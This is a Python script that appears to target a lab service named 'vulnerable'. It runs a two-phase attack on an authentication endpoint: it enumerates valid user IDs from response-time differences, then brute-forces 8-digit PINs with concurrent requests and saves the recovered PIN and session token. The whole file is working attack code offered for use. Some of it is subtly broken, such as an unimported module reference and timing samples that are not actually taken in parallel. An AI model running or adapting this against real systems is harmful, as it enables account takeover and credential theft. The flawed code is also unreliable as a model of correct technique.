import requests
import time
import statistics
import matplotlib.pyplot as plt
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm  # For progress bars
import numpy as np
import json

# Configuration
BASE_URL = "http://vulnerable:5000"
USER_ID_RANGE = (1000, 2000)  # Range of user IDs to test
PIN_LENGTH = 8
MAX_WORKERS = 10  # For concurrent requests
SAMPLE_SIZE = 7   # Number of samples per user (odd number for median)
THRESHOLD_MULTIPLIER = 1.5  # How much above median to consider valid

def measure_auth_time(uid, pin="00000000"):
    """Measure authentication time for a given user ID and PIN"""
    try:
        start = time.perf_counter()
        requests.post(
            f"{BASE_URL}/auth",
            json={"user_id": uid, "pin": pin},
            timeout=5  # Prevent hanging
        )
        return time.perf_counter() - start
    except requests.exceptions.RequestException:
        return None

def find_valid_user():
    """Identify valid user via timing differences"""
    print(f"[*] Scanning user IDs from {USER_ID_RANGE[0]} to {USER_ID_RANGE[1]}")
    
    timings = {}
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {}
        
        # Submit all user ID checks
        for uid in range(USER_ID_RANGE[0], USER_ID_RANGE[1] + 1):
            futures[executor.submit(
                statistics.median,
                [measure_auth_time(uid) for _ in range(SAMPLE_SIZE)]
            )] = uid
        
        # Process results with progress bar
        for future in tqdm(
            concurrent.futures.as_completed(futures),
            total=len(futures),
            desc="Testing User IDs"
        ):
            uid = futures[future]
            try:
                median_time = future.result()
                if median_time is not None:
                    timings[uid] = median_time
            except Exception as e:
                print(f"Error testing UID {uid}: {e}")
    
    if not timings:
        print("[-] No valid responses received")
        return None
    
    # Statistical analysis
    all_times = list(timings.values())
    global_median = statistics.median(all_times)
    global_mad = statistics.median(
        [abs(t - global_median) for t in all_times]
    )
    
    # Find outliers (potential valid users)
    threshold = global_median + THRESHOLD_MULTIPLIER * global_mad
    candidates = {
        uid: t for uid, t in timings.items()
        if t > threshold
    }
    
    if not candidates:
        print("[-] No timing anomalies detected")
        return None
    
    # Visualize results
    plt.figure(figsize=(12, 6))
    plt.bar(timings.keys(), timings.values(), color='blue', alpha=0.7, label='Normal')
    plt.bar(candidates.keys(), candidates.values(), color='red', alpha=0.7, label='Anomaly')
    plt.axhline(threshold, color='green', linestyle='--', label='Threshold')
    plt.xlabel("User ID")
    plt.ylabel("Response Time (s)")
    plt.title("Timing Attack Results")
    plt.legend()
    plt.grid(True)
    plt.savefig('timing_attack_results.png')
    plt.show()
    
    valid_user = max(candidates, key=candidates.get)
    print(f"[+] Identified user: {valid_user} (Δ={candidates[valid_user]-global_median:.4f}s)")
    return valid_user

def brute_force_pin(uid):
    """Brute-force PIN for identified user"""
    print(f"[*] Starting PIN brute-force for user {uid}")
    
    # First try common PINs
    common_pins = [
        "00000000", "11111111", "12345678", 
        "87654321", "99999999", "00000001",
        str(uid)[-PIN_LENGTH:].zfill(PIN_LENGTH)
    ]
    
    for pin in common_pins:
        try:
            response = requests.post(
                f"{BASE_URL}/auth",
                json={"user_id": uid, "pin": pin},
                timeout=3
            )
            if "token" in response.json():
                print(f"[+] Cracked PIN (common): {pin}")
                return pin
        except:
            continue
    
    # Full brute-force with progress tracking
    total = 10**PIN_LENGTH
    chunk_size = 1000
    
    for start in tqdm(range(0, total, chunk_size), desc="Brute-forcing PIN"):
        pins = [f"{i:0{PIN_LENGTH}d}" for i in range(start, min(start + chunk_size, total))]
        
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = {
                executor.submit(
                    requests.post,
                    f"{BASE_URL}/auth",
                    json={"user_id": uid, "pin": pin},
                    timeout=3
                ): pin for pin in pins
            }
            
            for future in concurrent.futures.as_completed(futures):
                pin = futures[future]
                try:
                    response = future.result()
                    if "token" in response.json():
                        print(f"[+] Cracked PIN: {pin}")
                        return pin
                except:
                    continue
    
    print("[-] Failed to find valid PIN")
    return None

def save_results(user_id, pin, token=None):
    """Save successful results to file"""
    result = {
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "user_id": user_id,
        "pin": pin,
        "token": token
    }
    
    with open("timing_attack_results.json", "w") as f:
        json.dump(result, f, indent=2)

def time_attack():
    """Execute full timing attack"""
    start_time = time.time()
    
    # Phase 1: Find valid user
    valid_user = find_valid_user()
    if not valid_user:
        return
    
    # Phase 2: Brute-force PIN
    pin = brute_force_pin(valid_user)
    if not pin:
        return
    
    # Phase 3: Get valid token
    try:
        response = requests.post(
            f"{BASE_URL}/auth",
            json={"user_id": valid_user, "pin": pin}
        )
        token = response.json().get("token")
        print(f"[+] Authentication token: {token}")
    except Exception as e:
        print(f"[-] Error getting token: {e}")
        token = None
    
    # Save results
    save_results(valid_user, pin, token)
    
    print(f"[*] Attack completed in {time.time()-start_time:.2f} seconds")
    return (valid_user, pin, token)

if __name__ == "__main__":
    time_attack()
